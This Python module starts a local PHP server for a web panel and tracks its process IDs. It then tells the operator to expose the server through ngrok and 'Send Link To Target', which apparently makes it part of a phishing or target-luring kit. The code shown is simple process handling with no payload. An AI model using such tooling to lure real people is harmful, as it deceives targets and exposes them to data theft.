import hashlib
import json
import os
import signal
import subprocess
import time

from colorama import Back, Fore, Style

from modules.paths import SETTINGS_FILE, WEB_DIR


def kill_php_proc():
    with open(SETTINGS_FILE, "r") as jsonFile:
        data = json.load(jsonFile)
        pids = data["pid"]

    for pid in pids:
        try:
            os.kill(pid, signal.SIGKILL)
        except ProcessLookupError:
            pass

    data["pid"] = []
    with open(SETTINGS_FILE, "w") as jsonFile:
        json.dump(data, jsonFile)


def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    return hashlib.md5(str2hash.encode())


def run_php_server(port):
    log_path = os.path.join(WEB_DIR, "log", f"php-{md5_hash().hexdigest()}.log")
    with open(log_path, "w") as php_log:
        proc = subprocess.Popen(
            ("php", "-S", f"localhost:{port}", "-t", WEB_DIR),
            stderr=php_log,
            stdout=php_log,
        )

    with open(SETTINGS_FILE, "r") as jsonFile:
        data = json.load(jsonFile)
        data["pid"].append(proc.pid)

    with open(SETTINGS_FILE, "w") as jsonFile:
        json.dump(data, jsonFile)

    print(Fore.RED + " [+] " + Fore.GREEN + "Web Panel Link : " + Fore.WHITE + f"http://localhost:{port}")
    print(
        Fore.RED + "\n [+] " + Fore.LIGHTCYAN_EX
        + f"Please Run NGROK On Port {port} AND Send Link To Target > "
        + Fore.YELLOW + Back.BLACK + f"ngrok http {port}\n" + Style.RESET_ALL
    )
